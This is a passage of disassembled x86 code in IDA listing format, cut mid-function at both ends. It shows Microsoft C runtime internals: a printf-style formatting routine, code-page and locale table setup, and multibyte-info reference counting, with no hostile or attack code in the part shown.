                lea     eax, [ebp+var_25C] ; jumptable 00410CDE case 0
                push    eax
                movzx   eax, dl
                push    eax
                mov     [ebp+var_238], esi
                call    sub_418D37
                pop     ecx
                test    eax, eax
                mov     al, [ebp+var_211]
                pop     ecx
                jz      short loc_410F28
                mov     ecx, [ebp+var_24C]
                lea     esi, [ebp+var_228]
                call    sub_410ABB
                mov     al, [ebx]
                inc     ebx
                mov     [ebp+var_23C], ebx
                test    al, al
                jz      loc_410BCC

loc_410F28:                             ; CODE XREF: sub_410B61+3A3↑j
                mov     ecx, [ebp+var_24C]
                lea     esi, [ebp+var_228]
                call    sub_410ABB
                jmp     loc_41168B      ; jumptable 00410CDE default case
; ---------------------------------------------------------------------------

loc_410F3E:                             ; CODE XREF: sub_410B61+17D↑j
                                        ; DATA XREF: .text:off_4116D9↓o
                movsx   eax, dl         ; jumptable 00410CDE case 7
                cmp     eax, 64h
                jg      loc_411132
                jz      loc_4111C9
                cmp     eax, 53h
                jg      loc_41104B
                jz      loc_410FDF
                sub     eax, 41h
                jz      short loc_410F74
                dec     eax
                dec     eax
                jz      short loc_410FC0
                dec     eax
                dec     eax
                jz      short loc_410F74
                dec     eax
                dec     eax
                jnz     loc_411506

loc_410F74:                             ; CODE XREF: sub_410B61+401↑j
                                        ; sub_410B61+409↑j
                add     dl, 20h
                mov     [ebp+var_270], 1
                mov     [ebp+var_211], dl

loc_410F87:                             ; CODE XREF: sub_410B61+4F9↓j
                                        ; sub_410B61+5EC↓j
                or      [ebp+var_210], 40h
                cmp     [ebp+var_218], esi
                lea     ebx, [ebp+MultiByteStr]
                mov     eax, 200h
                mov     [ebp+var_21C], ebx
                mov     [ebp+var_260], eax
                jge     loc_4111F9
                mov     [ebp+var_218], 6
                jmp     loc_411265
; ---------------------------------------------------------------------------

loc_410FC0:                             ; CODE XREF: sub_410B61+405↑j
                test    [ebp+var_210], 830h
                jnz     loc_411068
                or      [ebp+var_210], 800h
                jmp     loc_411068
; ---------------------------------------------------------------------------

loc_410FDF:                             ; CODE XREF: sub_410B61+3F8↑j
                test    [ebp+var_210], 830h
                jnz     short loc_410FF5
                or      [ebp+var_210], 800h

loc_410FF5:                             ; CODE XREF: sub_410B61+488↑j
                                        ; sub_410B61+7D8↓j
                mov     ecx, [ebp+var_218]
                cmp     ecx, 0FFFFFFFFh
                jnz     short loc_411005
                mov     ecx, 7FFFFFFFh

loc_411005:                             ; CODE XREF: sub_410B61+49D↑j
                add     edi, 4
                test    [ebp+var_210], 810h
                mov     [ebp+var_224], edi
                mov     edi, [edi-4]
                mov     [ebp+var_21C], edi
                jz      loc_4114D8
                cmp     edi, esi
                jnz     short loc_411036
                mov     eax, off_4251BC
                mov     [ebp+var_21C], eax

loc_411036:                             ; CODE XREF: sub_410B61+4C8↑j
                mov     eax, [ebp+var_21C]
                mov     [ebp+var_238], 1
                jmp     loc_4114CA
; ---------------------------------------------------------------------------

loc_41104B:                             ; CODE XREF: sub_410B61+3F2↑j
                sub     eax, 58h
                jz      loc_41132E
                dec     eax
                dec     eax
                jz      short loc_4110D1
                sub     eax, ecx
                jz      loc_410F87
                dec     eax
                dec     eax
                jnz     loc_411506

loc_411068:                             ; CODE XREF: sub_410B61+469↑j
                                        ; sub_410B61+479↑j
                add     edi, 4
                test    [ebp+var_210], 810h
                mov     [ebp+var_224], edi
                jz      short loc_4110AD
                movzx   eax, word ptr [edi-4]
                push    eax             ; WideCharStr
                push    200h            ; cbMultiByte
                lea     eax, [ebp+MultiByteStr]
                push    eax             ; lpMultiByteStr
                lea     eax, [ebp+var_220]
                push    eax             ; int
                call    sub_418D1A
                add     esp, 10h
                test    eax, eax
                jz      short loc_4110C0
                mov     [ebp+var_240], 1
                jmp     short loc_4110C0
; ---------------------------------------------------------------------------

loc_4110AD:                             ; CODE XREF: sub_410B61+51A↑j
                mov     al, [edi-4]
                mov     [ebp+MultiByteStr], al
                mov     [ebp+var_220], 1

loc_4110C0:                             ; CODE XREF: sub_410B61+53E↑j
                                        ; sub_410B61+54A↑j
                lea     eax, [ebp+MultiByteStr]
                mov     [ebp+var_21C], eax
                jmp     loc_411506
; ---------------------------------------------------------------------------

loc_4110D1:                             ; CODE XREF: sub_410B61+4F5↑j
                mov     eax, [edi]
                add     edi, 4
                mov     [ebp+var_224], edi
                cmp     eax, esi
                jz      short loc_41111B
                mov     ecx, [eax+4]
                cmp     ecx, esi
                jz      short loc_41111B
                test    [ebp+var_210], 800h
                movsx   eax, word ptr [eax]
                mov     [ebp+var_21C], ecx
                jz      short loc_411110
                cdq
                sub     eax, edx
                sar     eax, 1
                mov     [ebp+var_238], 1
                jmp     loc_411500
; ---------------------------------------------------------------------------

loc_411110:                             ; CODE XREF: sub_410B61+599↑j
                mov     [ebp+var_238], esi
                jmp     loc_411500
; ---------------------------------------------------------------------------

loc_41111B:                             ; CODE XREF: sub_410B61+57D↑j
                                        ; sub_410B61+584↑j
                mov     eax, off_4251B8
                mov     [ebp+var_21C], eax
                push    eax

loc_411127:                             ; CODE XREF: sub_410B61+7BE↓j
                call    sub_4102A0
                pop     ecx
                jmp     loc_411500
; ---------------------------------------------------------------------------

loc_411132:                             ; CODE XREF: sub_410B61+3E3↑j
                cmp     eax, 70h
                jg      loc_411336
                jz      loc_411324
                cmp     eax, 65h
                jl      loc_411506
                cmp     eax, 67h
                jle     loc_410F87
                cmp     eax, 69h
                jz      short loc_4111C9
                cmp     eax, 6Eh
                jz      short loc_411185
                cmp     eax, 6Fh
                jnz     loc_411506
                test    byte ptr [ebp+var_210], 80h
                mov     [ebp+var_220], 8
                jz      short loc_4111DA
                or      [ebp+var_210], 200h
                jmp     short loc_4111DA
; ---------------------------------------------------------------------------

loc_411185:                             ; CODE XREF: sub_410B61+5FA↑j
                mov     esi, [edi]
                add     edi, 4
                mov     [ebp+var_224], edi
                call    sub_418B98
                test    eax, eax
                jz      loc_410BCC
                test    byte ptr [ebp+var_210], 20h
                jz      short loc_4111B2
                mov     ax, word ptr [ebp+var_228]
                mov     [esi], ax
                jmp     short loc_4111BA
; ---------------------------------------------------------------------------

loc_4111B2:                             ; CODE XREF: sub_410B61+643↑j
                mov     eax, [ebp+var_228]
                mov     [esi], eax

loc_4111BA:                             ; CODE XREF: sub_410B61+64F↑j
                mov     [ebp+var_240], 1
                jmp     loc_41166F
; ---------------------------------------------------------------------------

loc_4111C9:                             ; CODE XREF: sub_410B61+3E9↑j
                                        ; sub_410B61+5F5↑j
                or      [ebp+var_210], 40h

loc_4111D0:                             ; CODE XREF: sub_410B61+7E0↓j
                mov     [ebp+var_220], 0Ah

loc_4111DA:                             ; CODE XREF: sub_410B61+616↑j
                                        ; sub_410B61+622↑j ...
                mov     ecx, [ebp+var_210]
                test    ecx, 8000h
                jz      loc_411395

loc_4111EC:                             ; CODE XREF: sub_410B61+83A↓j
                mov     eax, [edi]
                mov     edx, [edi+4]
                add     edi, 8
                jmp     loc_4113CE
; ---------------------------------------------------------------------------

loc_4111F9:                             ; CODE XREF: sub_410B61+44A↑j
                jnz     short loc_41120C
                cmp     dl, 67h
                jnz     short loc_411265
                mov     [ebp+var_218], 1
                jmp     short loc_411265
; ---------------------------------------------------------------------------

loc_41120C:                             ; CODE XREF: sub_410B61:loc_4111F9↑j
                cmp     [ebp+var_218], eax
                jle     short loc_41121A
                mov     [ebp+var_218], eax

loc_41121A:                             ; CODE XREF: sub_410B61+6B1↑j
                cmp     [ebp+var_218], 0A3h
                jle     short loc_411265
                mov     esi, [ebp+var_218]
                add     esi, 15Dh
                push    esi
                call    sub_412BB3
                mov     dl, [ebp+var_211]
                pop     ecx
                mov     [ebp+lpMem], eax
                test    eax, eax
                jz      short loc_411259
                mov     [ebp+var_21C], eax
                mov     [ebp+var_260], esi
                mov     ebx, eax
                jmp     short loc_411263
; ---------------------------------------------------------------------------

loc_411259:                             ; CODE XREF: sub_410B61+6E6↑j
                mov     [ebp+var_218], 0A3h

loc_411263:                             ; CODE XREF: sub_410B61+6F6↑j
                xor     esi, esi

loc_411265:                             ; CODE XREF: sub_410B61+45A↑j
                                        ; sub_410B61+69D↑j ...
                mov     eax, [edi]
                add     edi, 8
                mov     [ebp+var_278], eax
                mov     eax, [edi-4]
                mov     [ebp+var_274], eax
                lea     eax, [ebp+var_25C]
                push    eax
                push    [ebp+var_270]
                movsx   eax, dl
                push    [ebp+var_218]
                mov     [ebp+var_224], edi
                push    eax
                push    [ebp+var_260]
                lea     eax, [ebp+var_278]
                push    ebx
                push    eax
                push    off_425DF8
                call    sub_41217C
                pop     ecx
                call    eax
                mov     edi, [ebp+var_210]
                add     esp, 1Ch
                and     edi, 80h
                jz      short loc_4112E3
                cmp     [ebp+var_218], esi
                jnz     short loc_4112E3
                lea     eax, [ebp+var_25C]
                push    eax
                push    ebx
                push    off_425E04
                call    sub_41217C
                pop     ecx
                call    eax
                pop     ecx
                pop     ecx

loc_4112E3:                             ; CODE XREF: sub_410B61+760↑j
                                        ; sub_410B61+768↑j
                cmp     [ebp+var_211], 67h
                jnz     short loc_411308
                cmp     edi, esi
                jnz     short loc_411308
                lea     eax, [ebp+var_25C]
                push    eax
                push    ebx
                push    off_425E00
                call    sub_41217C
                pop     ecx
                call    eax
                pop     ecx
                pop     ecx

loc_411308:                             ; CODE XREF: sub_410B61+789↑j
                                        ; sub_410B61+78D↑j
                cmp     byte ptr [ebx], 2Dh
                jnz     short loc_41131E
                or      [ebp+var_210], 100h
                inc     ebx
                mov     [ebp+var_21C], ebx

loc_41131E:                             ; CODE XREF: sub_410B61+7AA↑j
                push    ebx
                jmp     loc_411127
; ---------------------------------------------------------------------------

loc_411324:                             ; CODE XREF: sub_410B61+5DA↑j
                mov     [ebp+var_218], 8

loc_41132E:                             ; CODE XREF: sub_410B61+4ED↑j
                mov     [ebp+var_248], ecx
                jmp     short loc_41135A
; ---------------------------------------------------------------------------

loc_411336:                             ; CODE XREF: sub_410B61+5D4↑j
                sub     eax, 73h
                jz      loc_410FF5
                dec     eax
                dec     eax
                jz      loc_4111D0
                sub     eax, 3
                jnz     loc_411506
                mov     [ebp+var_248], 27h

loc_41135A:                             ; CODE XREF: sub_410B61+7D3↑j
                test    byte ptr [ebp+var_210], 80h
                mov     [ebp+var_220], 10h
                jz      loc_4111DA
                mov     al, byte ptr [ebp+var_248]
                add     al, 51h
                mov     [ebp+var_22C], 30h
                mov     [ebp+var_22B], al
                mov     [ebp+var_230], 2
                jmp     loc_4111DA
; ---------------------------------------------------------------------------

loc_411395:                             ; CODE XREF: sub_410B61+685↑j
                test    ecx, 1000h
                jnz     loc_4111EC
                add     edi, 4
                test    cl, 20h
                jz      short loc_4113C1
                mov     [ebp+var_224], edi
                test    cl, 40h
                jz      short loc_4113BA
                movsx   eax, word ptr [edi-4]
                jmp     short loc_4113BE
; ---------------------------------------------------------------------------

loc_4113BA:                             ; CODE XREF: sub_410B61+851↑j
                movzx   eax, word ptr [edi-4]

loc_4113BE:                             ; CODE XREF: sub_410B61+857↑j
                cdq
                jmp     short loc_4113D4
; ---------------------------------------------------------------------------

loc_4113C1:                             ; CODE XREF: sub_410B61+846↑j
                mov     eax, [edi-4]
                test    cl, 40h
                jz      short loc_4113CC
                cdq
                jmp     short loc_4113CE
; ---------------------------------------------------------------------------

loc_4113CC:                             ; CODE XREF: sub_410B61+866↑j
                xor     edx, edx

loc_4113CE:                             ; CODE XREF: sub_410B61+693↑j
                                        ; sub_410B61+869↑j
                mov     [ebp+var_224], edi

loc_4113D4:                             ; CODE XREF: sub_410B61+85E↑j
                test    cl, 40h
                jz      short loc_4113F4
                cmp     edx, esi
                jg      short loc_4113F4
                jl      short loc_4113E3
                cmp     eax, esi
                jnb     short loc_4113F4

loc_4113E3:                             ; CODE XREF: sub_410B61+87C↑j
                neg     eax
                adc     edx, 0
                neg     edx
                or      [ebp+var_210], 100h

loc_4113F4:                             ; CODE XREF: sub_410B61+876↑j
                                        ; sub_410B61+87A↑j ...
                test    [ebp+var_210], 9000h
                mov     ebx, edx
                mov     edi, eax
                jnz     short loc_411406
                xor     ebx, ebx

loc_411406:                             ; CODE XREF: sub_410B61+8A1↑j
                cmp     [ebp+var_218], 0
                jge     short loc_41141B
                mov     [ebp+var_218], 1
                jmp     short loc_411435
; ---------------------------------------------------------------------------

loc_41141B:                             ; CODE XREF: sub_410B61+8AC↑j
                and     [ebp+var_210], 0FFFFFFF7h
                mov     eax, 200h
                cmp     [ebp+var_218], eax
                jle     short loc_411435
                mov     [ebp+var_218], eax

loc_411435:                             ; CODE XREF: sub_410B61+8B8↑j
                                        ; sub_410B61+8CC↑j
                mov     eax, edi
                or      eax, ebx
                jnz     short loc_411441
                and     [ebp+var_230], eax

loc_411441:                             ; CODE XREF: sub_410B61+8D8↑j
                lea     esi, [ebp+var_D]

loc_411444:                             ; CODE XREF: sub_410B61+924↓j
                mov     eax, [ebp+var_218]
                dec     [ebp+var_218]
                test    eax, eax
                jg      short loc_41145A
                mov     eax, edi
                or      eax, ebx
                jz      short loc_411487

loc_41145A:                             ; CODE XREF: sub_410B61+8F1↑j
                mov     eax, [ebp+var_220]
                cdq
                push    edx
                push    eax
                push    ebx
                push    edi
                call    sub_418D90
                add     ecx, 30h
                cmp     ecx, 39h
                mov     [ebp+var_260], ebx
                mov     edi, eax
                mov     ebx, edx
                jle     short loc_411482
                add     ecx, [ebp+var_248]

loc_411482:                             ; CODE XREF: sub_410B61+919↑j
                mov     [esi], cl
                dec     esi
                jmp     short loc_411444
; ---------------------------------------------------------------------------

loc_411487:                             ; CODE XREF: sub_410B61+8F7↑j
                lea     eax, [ebp+var_D]
                sub     eax, esi
                inc     esi
                test    [ebp+var_210], 200h
                mov     [ebp+var_220], eax
                mov     [ebp+var_21C], esi
                jz      short loc_411506
                test    eax, eax
                jz      short loc_4114B0
                mov     ecx, esi
                cmp     byte ptr [ecx], 30h
                jz      short loc_411506

loc_4114B0:                             ; CODE XREF: sub_410B61+946↑j
                dec     [ebp+var_21C]
                mov     ecx, [ebp+var_21C]
                mov     byte ptr [ecx], 30h
                inc     eax
                jmp     short loc_411500
; ---------------------------------------------------------------------------

loc_4114C2:                             ; CODE XREF: sub_410B61+96B↓j
                dec     ecx
                cmp     [eax], si
                jz      short loc_4114CE
                inc     eax
                inc     eax

loc_4114CA:                             ; CODE XREF: sub_410B61+4E5↑j
                cmp     ecx, esi
                jnz     short loc_4114C2

loc_4114CE:                             ; CODE XREF: sub_410B61+965↑j
                sub     eax, [ebp+var_21C]
                sar     eax, 1
                jmp     short loc_411500
; ---------------------------------------------------------------------------

loc_4114D8:                             ; CODE XREF: sub_410B61+4C0↑j
                cmp     edi, esi
                jnz     short loc_4114E7
                mov     eax, off_4251B8
                mov     [ebp+var_21C], eax

loc_4114E7:                             ; CODE XREF: sub_410B61+979↑j
                mov     eax, [ebp+var_21C]
                jmp     short loc_4114F6
; ---------------------------------------------------------------------------

loc_4114EF:                             ; CODE XREF: sub_410B61+997↓j
                dec     ecx
                cmp     byte ptr [eax], 0
                jz      short loc_4114FA
                inc     eax

loc_4114F6:                             ; CODE XREF: sub_410B61+98C↑j
                cmp     ecx, esi
                jnz     short loc_4114EF

loc_4114FA:                             ; CODE XREF: sub_410B61+992↑j
                sub     eax, [ebp+var_21C]

loc_411500:                             ; CODE XREF: sub_410B61+5AA↑j
                                        ; sub_410B61+5B5↑j ...
                mov     [ebp+var_220], eax

loc_411506:                             ; CODE XREF: sub_410B61+40D↑j
                                        ; sub_410B61+501↑j ...
                cmp     [ebp+var_240], 0
                jnz     loc_41166F
                mov     eax, [ebp+var_210]
                test    al, 40h
                jz      short loc_41154F
                test    eax, 100h
                jz      short loc_41152D
                mov     [ebp+var_22C], 2Dh
                jmp     short loc_411545
; ---------------------------------------------------------------------------

loc_41152D:                             ; CODE XREF: sub_410B61+9C1↑j
                test    al, 1
                jz      short loc_41153A
                mov     [ebp+var_22C], 2Bh
                jmp     short loc_411545
; ---------------------------------------------------------------------------

loc_41153A:                             ; CODE XREF: sub_410B61+9CE↑j
                test    al, 2
                jz      short loc_41154F
                mov     [ebp+var_22C], 20h

loc_411545:                             ; CODE XREF: sub_410B61+9CA↑j
                                        ; sub_410B61+9D7↑j
                mov     [ebp+var_230], 1

loc_41154F:                             ; CODE XREF: sub_410B61+9BA↑j
                                        ; sub_410B61+9DB↑j
                mov     ebx, [ebp+var_234]
                sub     ebx, [ebp+var_220]
                sub     ebx, [ebp+var_230]
                test    byte ptr [ebp+var_210], 0Ch
                jnz     short loc_411581
                push    [ebp+var_24C]
                lea     eax, [ebp+var_228]
                push    ebx
                push    20h
                call    sub_410AEE
                add     esp, 0Ch

loc_411581:                             ; CODE XREF: sub_410B61+A07↑j
                push    [ebp+var_230]
                mov     edi, [ebp+var_24C]
                lea     eax, [ebp+var_228]
                lea     ecx, [ebp+var_22C]
                call    sub_410B14
                test    byte ptr [ebp+var_210], 8
                pop     ecx
                jz      short loc_4115C3
                test    byte ptr [ebp+var_210], 4
                jnz     short loc_4115C3
                push    edi
                push    ebx
                push    30h
                lea     eax, [ebp+var_228]
                call    sub_410AEE
                add     esp, 0Ch

loc_4115C3:                             ; CODE XREF: sub_410B61+A45↑j
                                        ; sub_410B61+A4E↑j
                cmp     [ebp+var_238], 0
                mov     eax, [ebp+var_220]
                jz      short loc_411638
                test    eax, eax
                jle     short loc_411638
                mov     esi, [ebp+var_21C]
                mov     [ebp+var_260], eax

loc_4115E2:                             ; CODE XREF: sub_410B61+ACA↓j
                movzx   eax, word ptr [esi]
                dec     [ebp+var_260]
                push    eax             ; WideCharStr
                push    6               ; cbMultiByte
                lea     eax, [ebp+var_C]
                push    eax             ; lpMultiByteStr
                lea     eax, [ebp+var_268]
                inc     esi
                push    eax             ; int
                inc     esi
                call    sub_418D1A
                add     esp, 10h
                test    eax, eax
                jnz     short loc_41162F
                cmp     [ebp+var_268], eax
                jz      short loc_41162F
                push    [ebp+var_268]
                lea     eax, [ebp+var_228]
                lea     ecx, [ebp+var_C]
                call    sub_410B14
                cmp     [ebp+var_260], 0
                pop     ecx
                jnz     short loc_4115E2
                jmp     short loc_41164B
; ---------------------------------------------------------------------------

loc_41162F:                             ; CODE XREF: sub_410B61+AA4↑j
                                        ; sub_410B61+AAC↑j
                or      [ebp+var_228], 0FFFFFFFFh
                jmp     short loc_41164B
; ---------------------------------------------------------------------------

loc_411638:                             ; CODE XREF: sub_410B61+A6F↑j
                                        ; sub_410B61+A73↑j
                mov     ecx, [ebp+var_21C]
                push    eax
                lea     eax, [ebp+var_228]
                call    sub_410B14
                pop     ecx

loc_41164B:                             ; CODE XREF: sub_410B61+ACC↑j
                                        ; sub_410B61+AD5↑j
                cmp     [ebp+var_228], 0
                jl      short loc_41166F
                test    byte ptr [ebp+var_210], 4
                jz      short loc_41166F
                push    edi
                push    ebx
                push    20h
                lea     eax, [ebp+var_228]
                call    sub_410AEE
                add     esp, 0Ch

loc_41166F:                             ; CODE XREF: sub_410B61+663↑j
                                        ; sub_410B61+9AC↑j ...
                cmp     [ebp+lpMem], 0
                jz      short loc_41168B ; jumptable 00410CDE default case
                push    [ebp+lpMem]     ; lpMem
                call    sub_40FD55
                and     [ebp+lpMem], 0
                pop     ecx

loc_41168B:                             ; CODE XREF: sub_410B61+177↑j
                                        ; sub_410B61+1AF↑j ...
                mov     ebx, [ebp+var_23C] ; jumptable 00410CDE default case
                mov     al, [ebx]
                mov     [ebp+var_211], al
                test    al, al
                jz      short loc_4116B0
                mov     ecx, [ebp+var_26C]
                mov     edi, [ebp+var_224]
                mov     dl, al
                jmp     loc_410C91
; ---------------------------------------------------------------------------

loc_4116B0:                             ; CODE XREF: sub_410B61+12A↑j
                                        ; sub_410B61+13E↑j ...
                cmp     [ebp+var_250], 0
                jz      short loc_4116C3
                mov     eax, [ebp+var_254]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_4116C3:                             ; CODE XREF: sub_410B61+B56↑j
                mov     eax, [ebp+var_228]

loc_4116C9:                             ; CODE XREF: sub_410B61+9B↑j
                mov     ecx, [ebp+var_4]
                pop     edi
                pop     esi
                xor     ecx, ebp
                pop     ebx
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                leave
                retn
sub_410B61      endp

; ---------------------------------------------------------------------------
                db 90h
off_4116D9      dd offset loc_410EE4    ; DATA XREF: sub_410B61+17D↑r
                dd offset loc_410CE5    ; jump table for switch statement
                dd offset loc_410D15
                dd offset loc_410D73
                dd offset loc_410DBF
                dd offset loc_410DCA
                dd offset loc_410E10
                dd offset loc_410F3E

; =============== S U B R O U T I N E =======================================


sub_4116F9      proc near               ; CODE XREF: sub_411A3F+14E↓p
                                        ; sub_411A3F+1A3↓p
                sub     eax, 3A4h
                jz      short loc_411722
                sub     eax, 4
                jz      short loc_41171C
                sub     eax, 0Dh
                jz      short loc_411716
                dec     eax
                jz      short loc_411710
                xor     eax, eax
                retn
; ---------------------------------------------------------------------------

loc_411710:                             ; CODE XREF: sub_4116F9+12↑j
                mov     eax, 404h
                retn
; ---------------------------------------------------------------------------

loc_411716:                             ; CODE XREF: sub_4116F9+F↑j
                mov     eax, 412h
                retn
; ---------------------------------------------------------------------------

loc_41171C:                             ; CODE XREF: sub_4116F9+A↑j
                mov     eax, 804h
                retn
; ---------------------------------------------------------------------------

loc_411722:                             ; CODE XREF: sub_4116F9+5↑j
                mov     eax, 411h
                retn
sub_4116F9      endp


; =============== S U B R O U T I N E =======================================


sub_411728      proc near               ; CODE XREF: sub_411A3F+2D↓p
                mov     edi, edi
                push    esi
                push    edi
                mov     esi, eax
                push    101h
                xor     edi, edi
                lea     eax, [esi+1Ch]
                push    edi
                push    eax
                call    sub_413520
                xor     eax, eax
                movzx   ecx, ax
                mov     eax, ecx
                mov     [esi+4], edi
                mov     [esi+8], edi
                mov     [esi+0Ch], edi
                shl     ecx, 10h
                or      eax, ecx
                lea     edi, [esi+10h]
                stosd
                stosd
                stosd
                mov     ecx, offset unk_4251C0
                add     esp, 0Ch
                lea     eax, [esi+1Ch]
                sub     ecx, esi
                mov     edi, 101h

loc_41176C:                             ; CODE XREF: sub_411728+4B↓j
                mov     dl, [ecx+eax]
                mov     [eax], dl
                inc     eax
                dec     edi
                jnz     short loc_41176C
                lea     eax, [esi+11Dh]
                mov     esi, 100h

loc_411780:                             ; CODE XREF: sub_411728+5F↓j
                mov     dl, [eax+ecx]
                mov     [eax], dl
                inc     eax
                dec     esi
                jnz     short loc_411780
                pop     edi
                pop     esi
                retn
sub_411728      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41178C      proc near               ; CODE XREF: sub_411A3F+171↓p

var_51C         = dword ptr -51Ch
CPInfo          = _cpinfo ptr -518h
CharType        = word ptr -504h
var_304         = word ptr -304h
DestStr         = word ptr -204h
MultiByteStr    = byte ptr -104h
var_4           = dword ptr -4

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 51Ch
                mov     eax, ___security_cookie
                xor     eax, ebp
                mov     [ebp+var_4], eax
                push    ebx
                push    edi
                lea     eax, [ebp+CPInfo]
                push    eax             ; lpCPInfo
                push    dword ptr [esi+4] ; CodePage
                call    ds:GetCPInfo
                mov     edi, 100h
                test    eax, eax
                jz      loc_4118BB
                xor     eax, eax

loc_4117C2:                             ; CODE XREF: sub_41178C+40↓j
                mov     [ebp+eax+MultiByteStr], al
                inc     eax
                cmp     eax, edi
                jb      short loc_4117C2
                mov     al, [ebp+CPInfo.LeadByte]
                mov     [ebp+MultiByteStr], 20h
                test    al, al
                jz      short loc_41180D
                lea     ebx, [ebp+CPInfo.LeadByte+1]

loc_4117E5:                             ; CODE XREF: sub_41178C+7F↓j
                movzx   ecx, al
                movzx   eax, byte ptr [ebx]
                cmp     ecx, eax
                ja      short loc_411805
                sub     eax, ecx
                inc     eax
                push    eax
                lea     edx, [ebp+ecx+MultiByteStr]
                push    20h
                push    edx
                call    sub_413520
                add     esp, 0Ch

loc_411805:                             ; CODE XREF: sub_41178C+61↑j
                inc     ebx
                mov     al, [ebx]
                inc     ebx
                test    al, al
                jnz     short loc_4117E5

loc_41180D:                             ; CODE XREF: sub_41178C+51↑j
                push    0               ; int
                push    dword ptr [esi+0Ch] ; Locale
                lea     eax, [ebp+CharType]
                push    dword ptr [esi+4] ; CodePage
                push    eax             ; lpCharType
                push    edi             ; cbMultiByte
                lea     eax, [ebp+MultiByteStr]
                push    eax             ; lpMultiByteStr
                push    1               ; dwInfoType
                push    0               ; int
                call    sub_4193E9
                xor     ebx, ebx
                push    ebx             ; int
                push    dword ptr [esi+4] ; CodePage
                lea     eax, [ebp+DestStr]
                push    edi             ; cchDest
                push    eax             ; lpDestStr
                push    edi             ; cbMultiByte
                lea     eax, [ebp+MultiByteStr]
                push    eax             ; lpMultiByteStr
                push    edi             ; dwMapFlags
                push    dword ptr [esi+0Ch] ; Locale
                push    ebx             ; int
                call    sub_4191EA
                add     esp, 44h
                push    ebx             ; int
                push    dword ptr [esi+4] ; CodePage
                lea     eax, [ebp+var_304]
                push    edi             ; cchDest
                push    eax             ; lpDestStr
                push    edi             ; cbMultiByte
                lea     eax, [ebp+MultiByteStr]
                push    eax             ; lpMultiByteStr
                push    200h            ; dwMapFlags
                push    dword ptr [esi+0Ch] ; Locale
                push    ebx             ; int
                call    sub_4191EA
                add     esp, 24h
                xor     eax, eax

loc_411877:                             ; CODE XREF: sub_41178C+12B↓j
                movzx   ecx, [ebp+eax*2+CharType]
                test    cl, 1
                jz      short loc_411892
                or      byte ptr [esi+eax+1Dh], 10h
                mov     cl, byte ptr [ebp+eax+DestStr]
                jmp     short loc_4118A3
; ---------------------------------------------------------------------------

loc_411892:                             ; CODE XREF: sub_41178C+F6↑j
                test    cl, 2
                jz      short loc_4118AC
                or      byte ptr [esi+eax+1Dh], 20h
                mov     cl, byte ptr [ebp+eax+var_304]

loc_4118A3:                             ; CODE XREF: sub_41178C+104↑j
                mov     [esi+eax+11Dh], cl
                jmp     short loc_4118B4
; ---------------------------------------------------------------------------

loc_4118AC:                             ; CODE XREF: sub_41178C+109↑j
                mov     byte ptr [esi+eax+11Dh], 0

loc_4118B4:                             ; CODE XREF: sub_41178C+11E↑j
                inc     eax
                cmp     eax, edi
                jb      short loc_411877
                jmp     short loc_411911
; ---------------------------------------------------------------------------

loc_4118BB:                             ; CODE XREF: sub_41178C+2E↑j
                lea     eax, [esi+11Dh]
                mov     [ebp+var_51C], 0FFFFFF9Fh
                xor     ecx, ecx
                sub     [ebp+var_51C], eax

loc_4118D3:                             ; CODE XREF: sub_41178C+183↓j
                mov     edx, [ebp+var_51C]
                lea     eax, [esi+ecx+11Dh]
                add     edx, eax
                lea     ebx, [edx+20h]
                cmp     ebx, 19h
                ja      short loc_4118F6
                or      byte ptr [esi+ecx+1Dh], 10h
                mov     dl, cl
                add     dl, 20h
                jmp     short loc_411905
; ---------------------------------------------------------------------------

loc_4118F6:                             ; CODE XREF: sub_41178C+15C↑j
                cmp     edx, 19h
                ja      short loc_411909
                or      byte ptr [esi+ecx+1Dh], 20h
                mov     dl, cl
                sub     dl, 20h

loc_411905:                             ; CODE XREF: sub_41178C+168↑j
                mov     [eax], dl
                jmp     short loc_41190C
; ---------------------------------------------------------------------------

loc_411909:                             ; CODE XREF: sub_41178C+16D↑j
                mov     byte ptr [eax], 0

loc_41190C:                             ; CODE XREF: sub_41178C+17B↑j
                inc     ecx
                cmp     ecx, edi
                jb      short loc_4118D3

loc_411911:                             ; CODE XREF: sub_41178C+12D↑j
                mov     ecx, [ebp+var_4]
                pop     edi
                xor     ecx, ebp
                pop     ebx
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                leave
                retn
sub_41178C      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41191F      proc near               ; CODE XREF: sub_40E461+5B↑p
                                        ; sub_411C24+1A↓p

var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h

                push    0Ch
                push    offset stru_422D88
                call    __SEH_prolog4
                call    sub_412405
                mov     edi, eax
                mov     eax, dword_4256E4
                test    [edi+70h], eax
                jz      short loc_411959
                cmp     dword ptr [edi+6Ch], 0
                jz      short loc_411959
                mov     esi, [edi+68h]

loc_411945:                             ; CODE XREF: sub_41191F:loc_4119B5↓j
                test    esi, esi
                jnz     short loc_411951
                push    20h
                call    sub_412D65
                pop     ecx

loc_411951:                             ; CODE XREF: sub_41191F+28↑j
                mov     eax, esi
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_411959:                             ; CODE XREF: sub_41191F+1B↑j
                                        ; sub_41191F+21↑j
                push    0Dh
                call    sub_416913
                pop     ecx
                and     [ebp+ms_exc.registration.TryLevel], 0
                mov     esi, [edi+68h]
                mov     [ebp+var_1C], esi
                cmp     esi, lpAddend
                jz      short loc_4119A9
                test    esi, esi
                jz      short loc_411991
                push    esi             ; lpAddend
                call    ds:InterlockedDecrement
                test    eax, eax
                jnz     short loc_411991
                cmp     esi, offset unk_4251C0
                jz      short loc_411991
                push    esi             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_411991:                             ; CODE XREF: sub_41191F+56↑j
                                        ; sub_41191F+61↑j ...
                mov     eax, lpAddend
                mov     [edi+68h], eax
                mov     esi, lpAddend
                mov     [ebp+var_1C], esi
                push    esi             ; lpAddend
                call    ds:InterlockedIncrement

loc_4119A9:                             ; CODE XREF: sub_41191F+52↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_4119BA
; ---------------------------------------------------------------------------

loc_4119B5:                             ; CODE XREF: sub_41191F+A3↓j
                jmp     short loc_411945
; ---------------------------------------------------------------------------

loc_4119B7:                             ; DATA XREF: .rdata:stru_422D88↓o
                mov     esi, [ebp+var_1C]

